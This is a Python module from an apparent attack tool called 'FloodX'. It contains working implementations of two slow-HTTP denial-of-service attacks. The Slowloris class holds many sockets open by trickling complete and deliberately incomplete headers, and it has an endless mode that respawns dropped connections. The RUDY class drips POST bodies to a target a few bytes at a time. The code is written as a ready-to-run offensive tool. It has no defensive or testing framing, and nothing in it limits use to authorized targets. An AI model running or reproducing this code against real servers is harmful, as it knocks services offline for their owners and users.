"""
FloodX: Slowloris Attack Implementation
Slow HTTP header attack to exhaust server connection pools.
"""

import asyncio
import random
import time
import socket
from typing import Dict, Any, List
from urllib.parse import urlparse

from common.logger import logger, stats_logger
from config import USER_AGENTS


class SlowlorisFlooder:
    """Slowloris attack implementation using slow HTTP headers."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config['port']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.connections = []
        self.sent_count = 0
        self.error_count = 0
        
        # Slowloris specific settings
        self.header_delay = random.uniform(10, 30)  # Delay between headers
        self.keep_alive_interval = 15  # Keep connections alive interval
        
    async def run(self):
        """Execute the Slowloris attack."""
        logger.info(f"🐌 Starting Slowloris attack: {self.concurrency} slow connections for {self.duration}s")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Create semaphore for connection limit
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch connection tasks
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._slowloris_worker(semaphore, i))
                tasks.append(task)
            
            # Keep attack running for specified duration or endless if duration is 0
            if self.duration > 0:
                # Duration-based mode
                while self.running and (time.time() - start_time) < self.duration:
                    await asyncio.sleep(1)
                    
                    # Log progress every 10 seconds
                    if int(time.time() - start_time) % 10 == 0:
                        active_connections = len([t for t in tasks if not t.done()])
                        logger.info(f"🐌 Slowloris: {active_connections} active connections, {self.sent_count} headers sent")
            else:
                # Endless mode - run until interrupted
                logger.info("🔄 Running in endless mode - Ctrl+C to stop")
                try:
                    while self.running:
                        await asyncio.sleep(30)  # Report every 30 seconds
                        
                        active_connections = len([t for t in tasks if not t.done()])
                        logger.info(f"🐌 Slowloris: {active_connections} active connections, {self.sent_count} headers sent")
                        
                        # Restart connections if they died (continuous operation)
                        if active_connections < self.concurrency * 0.3:
                            logger.info("🔄 Restarting Slowloris connections for continuous operation...")
                            
                            # Cancel dead tasks
                            active_tasks = [t for t in tasks if not t.done()]
                            for task in tasks:
                                if task.done():
                                    task.cancel()
                            
                            # Start new connections to replace dead ones
                            tasks = active_tasks
                            needed_connections = self.concurrency - len(active_tasks)
                            for i in range(needed_connections):
                                task = asyncio.create_task(self._slowloris_worker(semaphore, len(tasks) + i))
                                tasks.append(task)
                                
                except KeyboardInterrupt:
                    logger.info("🛑 Endless Slowloris stopped by user")
                    self.running = False
            
            # Stop attack
            self.running = False
            
            # Wait for tasks to complete
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ Slowloris attack failed: {e}")
        finally:
            await self._cleanup_connections()
            logger.info(f"✅ Slowloris completed: {self.sent_count} headers sent, {self.error_count} errors")

    async def _slowloris_worker(self, semaphore: asyncio.Semaphore, worker_id: int):
        """Individual Slowloris connection worker."""
        async with semaphore:
            sock = None
            try:
                # Create socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                
                # Connect to target
                await asyncio.get_event_loop().run_in_executor(
                    None, sock.connect, (self.target, self.port)
                )
                
                logger.debug(f"🔗 Worker {worker_id}: Connected to {self.target}:{self.port}")
                
                # Send initial HTTP request line
                initial_request = f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n"
                sock.send(initial_request.encode())
                
                # Send basic headers
                headers = [
                    f"Host: {self.target}",
                    f"User-Agent: {random.choice(USER_AGENTS)}",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate",
                    "Connection: keep-alive",
                ]
                
                # Send headers slowly
                for header in headers:
                    if not self.running:
                        break
                    
                    sock.send(f"{header}\r\n".encode())
                    self.sent_count += 1
                    
                    # Update stats periodically
                    if self.sent_count % 100 == 0:
                        stats_logger.update_stats(
                            packets_sent=self.sent_count,
                            connections_attempted=1,
                            errors=self.error_count
                        )
                    
                    # Slow delay between headers
                    await asyncio.sleep(random.uniform(5, 15))
                
                # Keep the connection alive by sending incomplete headers
                incomplete_headers = [
                    "X-Requested-With: ",
                    "X-Real-IP: ",
                    "X-A: ",
                    "X-B: ",
                    "X-C: ",
                ]
                
                header_index = 0
                while self.running:
                    try:
                        # Send incomplete header to keep connection alive
                        header = incomplete_headers[header_index % len(incomplete_headers)]
                        sock.send(f"{header}".encode())  # Note: no \r\n to keep incomplete
                        
                        self.sent_count += 1
                        header_index += 1
                        
                        # Wait before sending next incomplete header
                        await asyncio.sleep(self.keep_alive_interval)
                        
                    except (ConnectionResetError, BrokenPipeError):
                        logger.debug(f"🔗 Worker {worker_id}: Connection reset, attempting reconnect")
                        break
                    except Exception as e:
                        logger.debug(f"🔗 Worker {worker_id}: Keep-alive error: {e}")
                        break
                
            except Exception as e:
                self.error_count += 1
                logger.debug(f"❌ Worker {worker_id}: Connection error: {e}")
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass

    async def _cleanup_connections(self):
        """Cleanup any remaining connections."""
        logger.debug("🧹 Cleaning up Slowloris connections")
        # Connections are handled in finally blocks of workers
        
    async def stop(self):
        """Stop the Slowloris attack."""
        logger.info("🛑 Stopping Slowloris attack...")
        self.running = False


class RudyFlooder:
    """RUDY (R-U-Dead-Yet) attack implementation using slow HTTP POST."""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.target = config['target']
        self.port = config['port']
        self.duration = config['duration']
        self.concurrency = config['concurrency']
        
        self.running = False
        self.sent_count = 0
        self.error_count = 0
        
        # RUDY specific settings
        self.post_delay = random.uniform(1, 5)  # Delay between POST data chunks
        self.chunk_size = random.randint(1, 10)  # Small chunks to send slowly
        
    async def run(self):
        """Execute the RUDY attack."""
        logger.info(f"📝 Starting RUDY attack: {self.concurrency} slow POST connections for {self.duration}s")
        
        try:
            self.running = True
            start_time = time.time()
            
            # Create semaphore for connection limit
            semaphore = asyncio.Semaphore(self.concurrency)
            
            # Launch connection tasks
            tasks = []
            for i in range(self.concurrency):
                task = asyncio.create_task(self._rudy_worker(semaphore, i))
                tasks.append(task)
            
            # Keep attack running for specified duration
            while self.running and (time.time() - start_time) < self.duration:
                await asyncio.sleep(1)
                
                # Log progress every 10 seconds
                if int(time.time() - start_time) % 10 == 0:
                    active_connections = len([t for t in tasks if not t.done()])
                    logger.info(f"📝 RUDY: {active_connections} active connections, {self.sent_count} bytes sent")
            
            # Stop attack
            self.running = False
            
            # Wait for tasks to complete
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception as e:
            logger.error(f"❌ RUDY attack failed: {e}")
        finally:
            logger.info(f"✅ RUDY completed: {self.sent_count} bytes sent, {self.error_count} errors")

    async def _rudy_worker(self, semaphore: asyncio.Semaphore, worker_id: int):
        """Individual RUDY connection worker."""
        async with semaphore:
            sock = None
            try:
                # Create socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                
                # Connect to target
                await asyncio.get_event_loop().run_in_executor(
                    None, sock.connect, (self.target, self.port)
                )
                
                # Generate large POST data
                post_data = "a" * 10000  # 10KB of data
                content_length = len(post_data)
                
                # Send POST request headers
                post_request = (
                    f"POST /form.php HTTP/1.1\r\n"
                    f"Host: {self.target}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {content_length}\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                
                sock.send(post_request.encode())
                
                # Send POST data very slowly, byte by byte
                bytes_sent = 0
                while self.running and bytes_sent < len(post_data):
                    # Send small chunk
                    chunk_end = min(bytes_sent + self.chunk_size, len(post_data))
                    chunk = post_data[bytes_sent:chunk_end]
                    
                    sock.send(chunk.encode())
                    bytes_sent += len(chunk)
                    self.sent_count += len(chunk)
                    
                    # Update stats periodically
                    if self.sent_count % 1000 == 0:
                        stats_logger.update_stats(
                            bytes_sent=self.sent_count,
                            connections_attempted=1,
                            errors=self.error_count
                        )
                    
                    # Slow delay between chunks
                    await asyncio.sleep(self.post_delay)
                
            except Exception as e:
                self.error_count += 1
                logger.debug(f"❌ RUDY Worker {worker_id}: Connection error: {e}")
            finally:
                if sock:
                    try:
                        sock.close()
                    except:
                        pass

    async def stop(self):
        """Stop the RUDY attack."""
        logger.info("🛑 Stopping RUDY attack...")
        self.running = False
